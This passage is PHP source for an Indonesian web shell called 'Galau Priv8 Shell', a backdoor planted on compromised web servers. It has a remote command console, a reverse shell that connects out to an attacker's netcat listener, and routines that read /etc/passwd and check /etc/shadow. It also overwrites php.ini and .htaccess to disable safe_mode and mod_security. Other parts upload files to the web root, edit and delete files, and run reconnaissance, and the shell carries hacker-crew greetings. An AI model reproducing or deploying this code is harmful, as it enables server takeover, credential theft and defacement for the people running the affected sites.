	#filez th { background-color: #111111; border: 1px solid #000; }
	#filez tr:hover { background-color: #222; }
	#filez a { color: #00ff00; text-decoration: none; }
	input, select { border: 1px solid #fff; background: transparent; color: white; }
	option { background: black; color: white; }
	.bigtext { width: 100%; height: 400px; resize: none; border: 1px solid #fff; background: #000; color: #fff; font-family: Courier New; }
	textarea { resize: none; background: transparent; color: white; }
	pre { font-family: Courier New; }
	.scode { border:1px solid #444;padding:5px;margin:0;overflow: auto; }
	#toolz table, tr, td { border: 1px solid #fff; }
	#toolz .meong { background: #222222; color: #fff; }
	li { list-style-type: none; display: inline; }
	#mekong tr, td { border: 0px solid #000; }
	.linkgw { font-family: Verdana; font-weight: bold; }
	.linkgw:hover { text-decoration: none; color: white; }
	.linknyo { background-color: #333333; border: 0px solid #000; border-bottom: 5px solid #444; border-top: 5px solid #444; border-right: 5px solid #444; border-left: 5px solid #444; } 
	.footer { background: #333333; border-bottom:5px solid #444; border-top:5px solid #444; border-right: 5px solid #444; border-left: 5px solid #444; }
	.miring { transform:rotate(-30deg); -ms-transform:rotate(-30deg); -webkit-transform:rotate(-30deg); -moz-transform:rotate(-30deg); font-size: 60px; }
	.miring:hover { transform:rotate(30deg); -ms-transform:rotate(30deg); -webkit-transform:rotate(30deg); -moz-transform:rotate(30deg); }
	.phpinfo table{ width:100%; padding:0 0 0 0; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px ; -webkit-box-shadow:0px 0px 5px ; }
	.phpinfo td{ background:#111111; color:#cccccc; padding:6px 8px;; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px; -webkit-box-shadow:0px 0px 5px ; }
	.phpinfo th { background:#191919; border-bottom:1px solid #333333; font-weight:normal; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px; -webkit-box-shadow:0px 0px 5px ; }
	.phpinfo h2, .phpinfo h2 a{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; -moz-border-radius: 5px; -moz-box-shadow:0px 0px 10px; -webkit-box-shadow:0px 0px 5px ;}
	</style>
	</head>
	<body>";
	if(!function_exists('posix_getegid')) { 
		$user = @get_current_user(); 
		$uid = @getmyuid(); 
		$gid = @getmygid(); 
		$group = "?"; 
	} 
	else { 
		$uid = @posix_getpwuid(@posix_geteuid()); 
		$gid = @posix_getgrgid(@posix_getegid()); 
		$user = $uid['name']; 
		$uid = $uid['uid']; 
		$group = $gid['name']; 
		$gid = $gid['gid']; 
	}
	
	$galau_cwd = "";
	$galau_path = explode("/", $galau_vx);
	foreach($galau_path as $galau_fdir => $galau_waduh){
		$galau_cwd .= "<a href=\"?meong=";
		for($xfont = 0; $xfont <= $galau_fdir; $xfont++){
			$galau_cwd .= $galau_path[$xfont];
			if($xfont != $galau_fdir){
				$galau_cwd .= "/";
			}
		}
		$galau_cwd .= "\">$galau_waduh</a>/";
	}
	
	foreach($galau_menu as $galau_meong){
		$galau_mex = "";
		foreach($galau_meong as $galau_morpheus){
			$galau_mex .= "<li><a class=\"linkgw\" href=\"".$galau_morpheus['url']."\">".$galau_morpheus['name']."&nbsp;</a></li>";
		}
	}

	if(@strtolower(substr(PHP_OS,0,3)) == "win"){
		$galau_letter = "";
		foreach(range("A", "Z") as $galau_drive){
			if(@is_dir($galau_drive.":\\")){
				$galau_letter .= "<a href=\"?meong=".$galau_drive.":\\\">[ ";
				if($galau_drive.":" != $galau_vx){
					$galau_letter .= $galau_drive;
				}
				else {
					$galau_letter .= "<span class=\"gayadeh\">".$galau_drive."</span>";
				}
				$galau_letter .= " ]</a>";
			}
		}
	}
	
	$mysql = galau_checkany("mysql_connect");
	$mssql = galau_checkany("mssql_connect");
	$pgsql = galau_checkany("pg_connect");
	$oracle = galau_checkany("oci_connect");

	$curl = galau_checkany("curl_version");
	$python = galau_toolscheck("python --version");
	$perl = galau_toolscheck("perl -v");
	$wget = galau_toolscheck("wget --help");
	$sm = (ini_get(strtolower("safe_mode")) == "on") ? "<font color=\"#dd0000\">ON</font>" : "<font color=\"#00ff00\">OFF</font>";
	
	$galau_head = "<b>System:</b>&nbsp;<font color=\"lime\">".substr(php_uname(), 0, 120)."</font><br>";
	$galau_head .= "<b>Software:</b>&nbsp;".$_SERVER['SERVER_SOFTWARE']."<br>";
	$galau_head .= "<b>PHP:</b>&nbsp;".phpversion()." on ".php_sapi_name()."<br>";
	$galau_head .= "<b>User:</b> ".$user."(".$uid.") <b>Group:</b> ".$group."(".$gid.")<br>";
	$galau_head .= "MySQL: ".$mysql." | MSSQL: ".$mssql." | PostgreSQL: ".$pgsql." | Oracle: ".$oracle."<br>";
	$galau_head .= "Python: ".$python." | Perl: ".$perl." | Wget: ".$wget." | Curl: ".$curl." | Safe Mode: ".$sm."<br>";
	$galau_head .= "Cwd: ".$galau_cwd."<br>";
	$galau_head .= (@strtolower(substr(PHP_OS,0,3)) == "win") ? "Drives: ".$galau_letter : "---";
	
	echo "<div id=\"mekong\">
	<table width=\"100%\"><tr><td><table><tr><td><div class=\"miring\"><font color=\"#dd0000\">Galau Priv8</font></div></td><td>".$galau_head."</td></tr></table></td></tr></table>
	</div><div class=\"linknyo\"><table width=\"100%\"><tr><td><center>".$galau_mex."</center></td></tr></table></div>";
}

function galau_footer(){
	global $galau_cwd, $galau_config;
	echo "<br><div id=\"toolz\"><table width=\"100%\"><tr><td><table width=\"800\">
	<tr><td class=\"meong\">Upload</td></tr>
	<tr><td><form enctype=\"multipart/form-data\" method=\"post\">
	<center><input type=\"radio\" name=\"tipe\" value=\"biasa\" checked>Biasa
	<input type=\"radio\" name=\"tipe\" value=\"htdocs\">root_html</center>
	<input type=\"file\" name=\"dosya\"><br>
	<input type=\"text\" name=\"your_path\" value=\"".@getcwd()."\">
	<input type=\"submit\" name=\"kirimaja\" value=\">>\"></form>
	</td></tr></table></td><td><table width=\"520\"><tr><td class=\"meong\">Bypass /etc/passwd</td></tr>
	<tr><td><form method=\"post\">
	<select name=\"bypass\">
	<option value=\"mshell_exec\">shell_exec</option>
	<option value=\"msystem\">system</option>
	<option value=\"mexec\">exec</option>
	<option value=\"mpassthru\">passthru</option>
	<option value=\"mposix_getpwuid\">posix_getpwuid</option>
	<option value=\"mpopen\">popen</option>
	<option value=\"mpcntl_exec\">pcntl_exec</option>
	<option value=\"mproc_open\">proc_open</option>
	</select>
	<input type=\"submit\" name=\"blekok\" value=\">>\"></form>
	</td></tr></table></td></tr>
	<tr><td><table width=\"800\"><tr><td class=\"meong\">Bypass Read File</td></tr>
	<form method=\"post\">
	<tr><td><input type=\"text\" style=\"width: 350px;\" name=\"filenyodeh\"><br>
	<select name=\"readme\">
	<option value='show_source'>show_source</option>
	<option value='highlight_file'>highlight_file</option>
	<option value='readfile'>readfile</option>
	<option value='include'>include</option>
	<option value='require'>require</option>
	<option value='file'>file</option>
	<option value='fread'>fread</option>
	<option value='file_get_contents'>file_get_contents</option>
	<option value='fgets'>fgets</option>
	<option value='curl_init'>curl_init</option>
	</select>
	<input type=\"submit\" name=\"go_baca\" value=\">>\"></form>
	</td></tr></table></td><td><table width=\"520\"><tr><td class=\"meong\">Bypass</td></tr>
	<tr><td><form method=\"post\">
	<input type=\"submit\" name=\"phpini\" value=\"Bypass php.ini\">
	<input type=\"submit\" name=\"htaccess\" value=\"Bypass Mod_Security\">
	<input type=\"submit\" name=\"htperl\" value=\"Bypass 500 Internal Error\">
	</form></td></tr></table></td></tr>
	</table></div><br>
	<div class=\"footer\">
	".$galau_config['copyright']."</div>
	</body></html>";
	
	if(isset($_POST['kirimaja'])){
		$tipeku = $_POST['tipe'];
		switch($tipeku){
			case "biasa":
				if(@copy($_FILES['dosya']['tmp_name'], "".$_POST['your_path']."/".$_FILES['dosya']['name']."")){
					echo "<script>alert('[!] Berhasil coy!');</script>";
				}
				else {
					echo "<script>alert('[!] Gagal euy!');</script>";
				}
				break;
			case "htdocs":
				$galau_root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['dosya']['name'];
				$galau_web = $_SERVER['HTTP_HOST']."/".$_FILES['dosya']['name'];
				if(is_writable($_SERVER['DOCUMENT_ROOT'])){
					if(@copy($_FILES['dosya']['tmp_name'], $galau_root)){
						echo "<script>alert('[!] Berhasil!');</script>";
					}
					else {
						echo "<script>alert('[!] Gagal!');</script>";
					}
				}
				else {
					echo "<script>alert('[i] Direktorinya gak writeable');</script>";
				}
				break;
			default: break;
		}
	}
	elseif(isset($_POST['blekok'])){
		$galau_bypass = $_POST['bypass'];
		switch($galau_bypass){
			case "mshell_exec":
				echo "<pre class=\"scode\">".shell_exec("cat /etc/passwd")."</pre>";
				break;
			case "mexec":
				echo "<pre class\"scode\">".exec("cat /etc/passwd")."</pre>";
				break;
			case "mpassthru":
				echo "<pre class=\"scode\">".passthru("cat /etc/passwd")."</pre>";
				break;
			case "msystem":
				echo "<pre class=\"scode\">".system("cat /etc/passwd")."</pre>";
				break;
			case "mposix_getpwuid":
				if(!function_exists('posix_getpwuid')){
					die("<script>alert('posix_getpwuid is disabled');</script>");
				}
				
				echo "<pre class=\"scode\">";
				for($uid=0;$uid<60000;$uid++){ 
					$ara = posix_getpwuid($uid);
					if (!empty($ara)) {
						while (list ($key, $val) = each($ara)){
							print "$val:";
						}
						print "\n";
					}
				}
				echo "</pre>";
				break;
			case "mpopen":
				echo "<pre class=\"file\">";
				$boxes = "";
				$pf = @popen("cat /etc/passwd", "r");
				while(!feof($pf)){
					$boxes .= fread($pf, 1024);
				}
				pclose($pf);
				echo $boxes;
				echo "</pre>";
				break;
			case "mpcntl_exec":
				echo "<pre class=\"file\">".pcntl_exec('cat /etc/passwd')."</pre>";
				break;
			case "mproc_open":
				echo "<pre class=\"file\">";
				$proc=proc_open("cat /etc/passwd",array(
				array("pipe","r"),
				array("pipe","w"),
				array("pipe","w")
				),$pipes);
				$pox = stream_get_contents($pipes[1]);
				echo $pox;
				echo "</pre>";
				break;
			default: 
				die("<pre class=\"file\">I cant bypass it anymore :(</pre>");
				break;
		}
	}
	elseif(isset($_POST['go_baca'])){
		$galau_readme = $_POST['readme'];
		switch($galau_readme){
			case 'show_source': $show =  @show_source($_POST['filenyodeh']);  break;
			case 'highlight_file': $highlight = @highlight_file($_POST['filenyodeh']); break;
			case 'readfile': $readfile = @readfile($_POST['filenyodeh']);  break;
			case 'include': $include = @include($_POST['filenyodeh']); break;
			case 'require': $require = @require($_POST['filenyodeh']);  break;
			case 'file': $file =  @file($_POST['filenyodeh']);  foreach ($_POST['filenyodeh'] as $key => $value) {  print $value; }  break;
			case 'fread': $fopen = @fopen($_POST['filenyodeh'],"r") or die("Unable to open file!"); $fread = @fread($fopen,90000); fclose($fopen); print_r($fread); break;
			case 'file_get_contents': $file_get_contents =  @file_get_contents($_POST['filenyodeh']); print_r($file_get_contents);  break;
			case 'fgets': $fgets = @fopen($_POST['filenyodeh'],"r") or die("Unable to open file!"); while(!feof($fgets)) { echo fgets($fgets); } fclose($fgets); break;
			case 'curl_init': $ch = curl_init("file:///".$_POST['filenyodeh']."\x00/../../../../../../../../../../../../".__FILE__); curl_exec($ch); break;
			default: break; 
		}
	}
	elseif(isset($_POST['phpini'])){
		$galau_inibypass = "safe_mode = Off 
		disable_functions = None 
		safe_mode_gid = OFF 
		open_basedir = OFF 
		allow_url_fopen = On
		allow_url_include = On";
		$jiro = @fopen("php.ini", "w");
		fwrite($jiro, $galau_inibypass);
		@fclose($jiro);
	}
	elseif(isset($_POST['htaccess'])){
		$galau_htaccessbypass = "<IfModule mod_security.c> 
		SecFilterEngine Off 
		SecFilterScanPOST Off 
		SecFilterCheckURLEncoding Off 
		SecFilterCheckUnicodeEncoding Off 
		</IfModule>";
		$jiro = @fopen(".htaccess", "w");
		fwrite($jiro, $galau_inibypass);
		@fclose($jiro);
	}
	elseif(isset($_POST['htaperl'])){
		$galau_htaperlbypass = "Options FollowSymLinks MultiViews Indexes ExecCGI
        AddType application/x-httpd-cgi .sh
        AddHandler cgi-script .pl
        AddHandler cgi-script .pl";
		$jiro = @fopen(".htaccess", "w");
		fwrite($jiro, $galau_inibypass);
		@fclose($jiro);
	}
}

if(isset($_GET['poxis']) && $_GET['poxis'] == "console"){
	if(isset($_POST['suntik'])){
		$galau_initeh = galau_exe($_POST['mycmd']);
	}

	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">Console</td></tr>
	<form method=\"post\">
	<tr><td>".$_SERVER['HTTP_HOST']."@".$_SERVER['HTTP_HOST'].":~$ <input type=\"text\" name=\"mycmd\" style=\"width: 350px;\">
	<input type=\"submit\" name=\"suntik\" value=\">>\"><br><br>
	<textarea readonly class=\"bigtext\">".$galau_initeh."</textarea>
	</form></td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['poxis']) && $_GET['poxis'] == "info"){
	$galau_kolex = (ini_get(strtolower("safe_mode")) == "on") ? "<font color=\"#dd0000\">ON</font>" : "<font color=\"#00ff00\">OFF</font>";
	$galau_ayaweh = @ini_get('disable_functions');
	$galau_kepo = (!empty($galau_ayaweh)) ? "<font color=red>".$galau_ayaweh."</font>" : "<font color=lime>All Function Enabled</font>";
	
	$galau_info = "<b>Server Software:</b> <font color=\"lime\">".$_SERVER['SERVER_SOFTWARE']."</font><br>";
	$galau_info .= "<b>Disabled Function:</b> ".$galau_kepo."<br>";
	if(get_magic_quotes_gpc() == "1" || get_magic_quotes_gpc() == "on"){
		$galau_info .= "<b>Magic Quotes:</b> <font color=\"lime\">ON</font><br>";
	}
	else {
		$galau_info .= "<b>Magic Quotes:</b> <font color=\"red\">OFF</font><br>";
	}
	if(strtolower(ini_get('open_basedir')) == "on"){
		$galau_info .= "<b>Open Basedir:</b> <font color=\"red\">".ini_get('open_basedir')."</font><br>";
	}
	else {
		$galau_info .= "<b>Open Basedir:</b> <font color=\"lime\">OFF</font><br>";
	}
	$galau_info .= "<b>Safe Mode:</b> ".$galau_kolex."<br>";
	$galau_info .= "<b>Server Ip:</b> ".gethostbyname($_SERVER['HTTP_HOST'])."<br>";
	$galau_info .= "<b>Kernel Version:</b> ".@php_uname()."<br>";
	$galau_info .= "<b>Loaded Apache Modules:</b> <font color=\"red\">".implode(", ", @apache_get_modules())."</font><br><br>";
	
	
	if(@strtolower(substr(PHP_OS, 0, 3)) == "nix"){
		$galau_info .= "<b>Os Version:</b> ".@file_get_contents('/proc/version')."<br>";
		$galau_info .= "<b>HDD:</b><br><pre class=\"scode\">".galau_exe('df -h')."</pre><br>";
		$galau_info .= "<b>Readable /etc/passwd:</b> ".@is_readable('/etc/passwd') ? "<font color=\"lime\">Yes</font>" : "<font color=\"red\">No</font>"."<br>";
		$galau_info .= "<b>Readable /etc/shadow:</b> ".@is_readable('/etc/shadow') ? "<font color=\"lime\">Yes</font>" : "<font color=\"red\">No</font>"."<br>";
	}
	else {
		$galau_info .= "<b>Os Version:</b>".galau_exe('ver')."<br>";
		$galau_info .= "<b>User Account:</b><br><pre class=\"scode\">".galau_exe('net user')."</pre><br>";
		$galau_info .= "<b>Account Settings:</b><br><pre class=\"scode\">".galau_exe('net accounts')."</pre><br>";
	}

	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">Server Information</td></tr>
	<tr><td>".$galau_info."</td></tr>
	</table></div>";
	galau_footer();
}
elseif(isset($_GET['poxis']) && $_GET['poxis'] == "about"){
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">About Me</td></tr>
	<tr><td><center><h1>Galau Priv8 Shell</h1></center>
	<center>Dari sekian banyak pilihan, kita hanya akan memilih satu<br>
	Sama sepertimu, dari sekian banyak orang yang kau kenal, hanya aku yang kau pilih.<br>
	Yang bahkan, kau tak pernah mengenalku sebelumnya.</center>
	[+] Coder: ./MyHeartIsyr<br>
	[+] Codename: Galau<br>
	[+] Release date: Unknown<br>
	[+] Gr33tz to:<br><br>
	M2.3x<br>
	FalahGo5<br>
	IndoXploit<br>
	X-Code<br>
	And all Indonesian Defacer & Hackers Team<br><br>
	Contact me at: myheart-isyr@linuxmail.org or octal2ascii@asia.com<br>
	</td></tr></table>
	</div>";
	galau_footer();
}
elseif(isset($_GET['poxis']) && $_GET['poxis'] == "keluar"){
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<meta http-equiv=\"refresh\" content=\"0; url=".$_SERVER['PHP_SELF']."\">";
}
elseif(isset($_GET['poxis']) && $_GET['poxis'] == "bcme"){
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">Reverse Connect</td></tr>
	<form method=\"post\" onsubmit=\"return confirm('Use: nc -lvp '+document.getElementById('reverse-port').value+' and type exit or quit to \\nterminate')\">
	<tr><td><table><tr><td>Remote Ip:</td><td><input type=\"text\" name=\"reverse-ip\" value=\"".$_SERVER['REMOTE_ADDR']."\"></td></tr>
	<tr><td>Remote Port:</td><td><input type=\"text\" name=\"reverse-port\" id=\"reverse-port\" value=\"1337\"></td></tr>
	<tr><td><select name='socket'>
	<option value='fsockopen'>fsockopen</option>
	<option value='socket_create'>socket_create</option>
	<option value='stream_socket_client'>stream_socket_client</option>
	</select>
	<input type=\"submit\" name=\"go_bc\" value=\"Reverse!\"></td></tr></table></td></tr>
	</form>
	<tr><td>
	<pre class=\"scode\">Terminal: ".galau_exe('whoami');
	
	if(isset($_POST['go_bc'])){
		if($_POST['socket'] == "fsockopen"){
			$galau_host = $_POST['reverse-ip'];
			$galau_port = $_POST['reverse-port'];
			$fp = @fsockopen($galau_host, $galau_port, $galau_errno, $galau_errstr);
			if($galau_errno != 0){
				echo "<font color=\"red\"><b>".$galau_errno.":</b>".$galau_errstr."</font>";
			}
			else {
				fputs($fp, "
\t\t ** ================================================================================================= **
\t\t ** ==                            Galau Priv8 Has Pwnedz Your System                               == **
\t\t ** ==                                    No System Is Safe                                        == **
\t\t ** ================================================================================================= **
\t\t ** == Special Greetz to:                                                                          == **
\t\t ** == [x] M2.3x                                                                                   == **
\t\t ** == [x] FalahGo5                                                                                == **
\t\t ** == [x] Snow White (i'm sorry for my stupidity)                                                 == **
\t\t ** == [x] All Hackers In The World                                                                == **
\t\t ** == [x] You                                                                                     == **
\t\t ** ================================================================================================= **\n");
				while(!feof($fp)){
					fwrite($fp, "root@hacked:~# ");
					$galau_cmd = fgets($fp, 1024);
					if(trim($galau_cmd) == "quit" || trim($galau_cmd) == "exit"){
						fclose($fp);
						echo $galau_cmd;
						exit;
					}
					fwrite($fp, galau_exe($galau_cmd));	
				}
				fclose($fp);
			}
		}
		elseif($_POST['socket'] == "socket_create"){
			$galau_host = $_POST['reverse-ip'];
			$galau_port = $_POST['reverse-port'];
			$fp = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
			socket_set_nonblock($fp);
			if(!$fp){
				echo "<font color=\"red\">Connection Refused</font>";
			}
			else {
				while(!@socket_connect($fp, $galau_host, $galau_port)){
					@socket_write($fp, "root@hacked:~# ", strlen("root@hacked:~# "));
					$galau_input = @socket_read($fp, 1024, PHP_NORMAL_READ);
					if(trim($galau_input) == "quit" || trim($galau_input) == "exit"){
						socket_set_block($fp);
						socket_close($fp);
						echo $galau_input;
						exit;
					}
					@socket_write($fp, galau_exe($galau_input), strlen(galau_exe($galau_input)));
				}
				socket_set_block($fp);
				socket_close($fp);
			}
		}
		elseif($_POST['socket'] == "stream_socket_client"){
			$galau_host = $_POST['reverse-ip'];
			$galau_port = $_POST['reverse-port'];
			$fp = @stream_socket_client("tcp://$galau_host:$galau_port", $galau_errcode, $galau_errstr);
			if(!$fp){
				echo "<font color=\"red\"><b>".$galau_errcode.":</b>".$galau_errstr."</font>";
			}
			else {
				while(!feof($fp)){
					fwrite($fp, "root@hacked:~# ");
					$galau_cmd = fgets($fp, 1024);
					if(trim($galau_cmd) == "quit" || trim($galau_cmd) == "exit"){
						fclose($fp);
						echo $galau_cmd;
						exit;
					}
					fwrite($fp, galau_exe($galau_cmd));
				}
				fclose($fp);
			}
		}
	}
	echo "</pre></td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['poxis']) && $_GET['poxis'] == "phpinfo"){
	galau_header();
	
	@ini_set('output_buffering', 0);
    @ob_start();
    eval("phpinfo();");
    $galau_buff = @ob_get_contents();
    @ob_end_clean();
    $galau_abus = strpos($galau_buff, "<body>") + 6;
    $galau_box = strpos($galau_buff, "</body>");
    echo "<div class=\"phpinfo\">" . substr($galau_buff, $galau_abus, $galau_box - $galau_abus) . "</div>";
	
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "newfile"){
	if(isset($_POST['bikinbaru'])){
		$filebaru = htmlspecialchars($_POST['filebaru']);
		galau_newfile($filebaru);
	}
	
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">New File</td></tr>
	<tr><td>
	<form method='post'>
	Filename: <input type='text' name='filebaru' value='$galau_vx/newfile.php' style='width: 450px;'>
	<input type='submit' name='bikinbaru' value='>>'>
	</form>
	</td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "newfolder"){
	if(isset($_POST['newone'])){
		galau_newfolder($_POST['funsec'], $galau_vx);
	}
	
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">New Folder</td></tr>
	<tr><td>
	<form method='post'>
	Folder Name: <input type='text' name='funsec' style='width: 450px;'>
	<input type='submit' name='newone' value='>>'>
	</form>
	</td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "gantinama"){
	if(isset($_POST['ayoganti'])){
		$dir_rename = rename($galau_vx, "".dirname($galau_vx)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename){
			echo "<script>alert('Done');</script>";
		}
		else {
			echo "<script>alert('Permission Denied');</script>";
		}
	}
	
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">New Folder</td></tr>
	<tr><td>
	<form method='post'>
	<input type='text' value='".basename($galau_vx)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='ayoganti' value='>>'>
	</form>
	</td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "delme"){
	galau_rm($galau_vx);
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "view"){
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">File Action</td></tr>
	<tr><td>
	Filename: <font color=\"lime\">".basename($_GET['apalo_file'])."</font>
	<a href=\"?aksi=view&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">View</a> |
	<a href=\"?aksi=edit&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Edit</a> |
	<a href=\"?aksi=renamefile&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Rename</a> |
	<a href=\"?aksi=delete&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Delete</a> |
	<a href=\"?aksi=highlight&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Highlight</a> |
	<a href=\"?aksi=sedot&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Download</a> |
	<a href=\"?aksi=chmod&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Chmod</a><br>
	<pre class=\"scode\">".htmlspecialchars(@file_get_contents($_GET['apalo_file']))."</pre>
	</td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "highlight"){
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">File Action</td></tr>
	<tr><td>
	Filename: <font color=\"lime\">".basename($_GET['apalo_file'])."</font>
	<a href=\"?aksi=view&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">View</a> |
	<a href=\"?aksi=edit&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Edit</a> |
	<a href=\"?aksi=renamefile&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Rename</a> |
	<a href=\"?aksi=delete&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Delete</a> |
	<a href=\"?aksi=highlight&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Highlight</a> |
	<a href=\"?aksi=sedot&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Download</a> |
	<a href=\"?aksi=chmod&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Chmod</a><br>";
	
	$crs = highlight_file($_GET['apalo_file'], true);
	echo "<div style='background: #e1e1e1; color: #000000;'>";
	str_replace(array("<span ", "</span>"), array("<font ", "</font>"), $crs);
	echo $crs;
	echo "</div></td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "edit"){
	if(isset($_POST['simpan_gan'])){
		$galau_save = @fopen($_GET['apalo_file'], "w");
		if(fwrite($galau_save, $_POST['isinye'])){
			echo "<script>alert('Berhasil!');</script>";
		}
		else {
			echo "<script>alert('Gagal!');</script>";
		}
	}
	
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">File Action</td></tr>
	<tr><td>
	Filename: <font color=\"lime\">".basename($_GET['apalo_file'])."</font>
	<a href=\"?aksi=view&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">View</a> |
	<a href=\"?aksi=edit&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Edit</a> |
	<a href=\"?aksi=renamefile&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Rename</a> |
	<a href=\"?aksi=delete&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Delete</a> |
	<a href=\"?aksi=highlight&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Highlight</a> |
	<a href=\"?aksi=sedot&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Download</a> |
	<a href=\"?aksi=chmod&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Chmod</a><br>
	<form method='post'>
	<textarea class=\"bigtext\" name='isinye'>".htmlspecialchars(@file_get_contents($_GET['apalo_file']))."</textarea><br>
	<input type='submit' value='>>' name='simpan_gan'>
	</form></td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "chmod"){
	if(isset($_POST['chmod_gan'])){
		galau_chmodfile($galau_vx, $_POST['akupunya']);
	}
	
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">File Action</td></tr>
	<tr><td>
	Filename: <font color=\"lime\">".basename($_GET['apalo_file'])."</font>
	<a href=\"?aksi=view&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">View</a> |
	<a href=\"?aksi=edit&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Edit</a> |
	<a href=\"?aksi=renamefile&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Rename</a> |
	<a href=\"?aksi=delete&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Delete</a> |
	<a href=\"?aksi=highlight&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Highlight</a> |
	<a href=\"?aksi=sedot&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Download</a> |
	<a href=\"?aksi=chmod&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Chmod</a><br>
	<form method='post'>
	<input name='akupunya' type=\"text\" value=\"".substr(sprintf('%o', fileperms($galau_vx)), -4)."\"><br>
	<input type='submit' value='>>' name='chmod_gan'>
	</form></td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "renamefile"){
	if(isset($_POST['kapanye'])){
		$galau_rename = rename($_GET['apalo_file'], "$galau_vx/".htmlspecialchars($_POST['manaya'])."");
		if($galau_rename){
			echo "<script>alert('Berhasil');</script>";
		}
		else {
			echo "<script>alert('Gagal');</script>";
		}
	}
	
	galau_header();
	echo "<div id=\"toolz\"><table width=\"100%\"><tr><td class=\"meong\">File Action</td></tr>
	<tr><td>
	Filename: <font color=\"lime\">".basename($_GET['apalo_file'])."</font>
	<a href=\"?aksi=view&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">View</a> |
	<a href=\"?aksi=edit&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Edit</a> |
	<a href=\"?aksi=renamefile&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Rename</a> |
	<a href=\"?aksi=delete&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Delete</a> |
	<a href=\"?aksi=highlight&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Highlight</a> |
	<a href=\"?aksi=sedot&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Download</a> |
	<a href=\"?aksi=chmod&meong=$galau_vx&apalo_file=".$_GET['apalo_file']."\">Chmod</a><br>
	<form method='post'>
	<input name='manaya' type=\"text\" value=\"".basename($_GET['apalo_file'])."\"><br>
	<input type='submit' value='>>' name='kapanye'>
	</form></td></tr></table></div>";
	galau_footer();
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "delete"){
	galau_del($_GET['apalo_file']);
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "sedot"){
	@ob_clean();
	$galau_fanber = $_GET['apalo_file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($galau_fanber).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($galau_fanber));
	readfile($galau_fanber);
	exit;
}
elseif(isset($_GET['aksi']) && $_GET['aksi'] == "gzdot") {
	$galau_fanberze = $_GET['apalo_file'];
